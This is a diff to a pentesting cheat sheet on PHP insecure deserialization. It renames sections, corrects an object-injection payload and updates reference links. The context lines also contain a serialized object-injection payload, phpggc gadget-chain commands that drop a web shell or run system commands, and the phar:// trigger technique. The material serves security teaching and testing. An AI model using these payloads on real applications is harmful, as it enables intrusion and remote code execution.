@@ -14,8 +14,9 @@ Also you should check the `Wrapper Phar://` in [File Inclusion](https://github.c
 
 * [General concept](#general-concept)
 * [Authentication bypass](#authentication-bypass)
+* [Object Injection](#object-injection)
 * [Finding and using gadgets](#finding-and-using-gadgets)
-* [PHP Phar Deserialization](#php-phar-deserialization)
+* [Phar Deserialization](#phar-deserialization)
 * [Real world examples](#real-world-examples)
 * [References](#references)
 
@@ -82,13 +83,13 @@ a:2:{s:8:"username";b:1;s:8:"password";b:1;}
 
 Because `true == "str"` is true.
 
-### Object reference
+## Object Injection
 
 Vulnerable code:
 
 ```php
 <?php
-class Object
+class ObjectExample
 {
   var $guess;
   var $secretCode;
@@ -108,7 +109,7 @@ if($obj) {
 Payload:
 
 ```php
-O:6:"Object":2:{s:10:"secretCode";N;s:4:"guess";R:2;}
+O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
 ```
 
 We can do an array like this:
@@ -145,7 +146,7 @@ phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
 phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
 ```
 
-## PHP Phar Deserialization
+## Phar Deserialization
 
 Using `phar://` wrapper, one can trigger a deserialization on the specified file like in `file_get_contents("phar://./archives/app.phar")`.
 
@@ -214,7 +215,6 @@ A valid PHAR includes four elements:
     $phar->stopBuffering();
     ```
 
-
 ## Real world examples
 
 * [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410237)
@@ -230,10 +230,11 @@ A valid PHAR includes four elements:
 * [PHP Generic Gadget - ambionics security](https://www.ambionics.io/blog/php-generic-gadget-chains)
 * [POC2009 Shocking News in PHP Exploitation](https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
 * [PHP Internals Book - Serialization](http://www.phpinternalsbook.com/classes_objects/serialization.html)
-* [TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec](https://rawsec.ml/en/meepwn-2017-write-ups/#TSULOTT-Web)
+* [TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec](https://blog.raw.pm/en/meepwn-2017-write-ups/#TSULOTT-Web)
 * [CTF writeup: PHP object injection in kaspersky CTF](https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
-* [Jack The Ripper Web challeneg Write-up from ECSC 2019 Quals Team France by Rawsec](https://rawsec.ml/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
+* [Jack The Ripper Web challeneg Write-up from ECSC 2019 Quals Team France by Rawsec](https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
 * [Rusty Joomla RCE Unserialize overflow - Alessandro Groppo - October 3, 2019](https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)
 * [PHP Pop Chains - Achieving RCE with POP chain exploits. - Vickie Li - September 3, 2020](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
 * [How to exploit the PHAR Deserialization Vulnerability - Alexandru Postolache - May 29, 2020](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
 * [phar:// deserialization - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
+* [Finding PHP Serialization Gadget Chain - DG'hAck Unserial killer - Aug 11, 2022 - xanhacks](https://www.xanhacks.xyz/p/php-gadget-chain/#introduction)
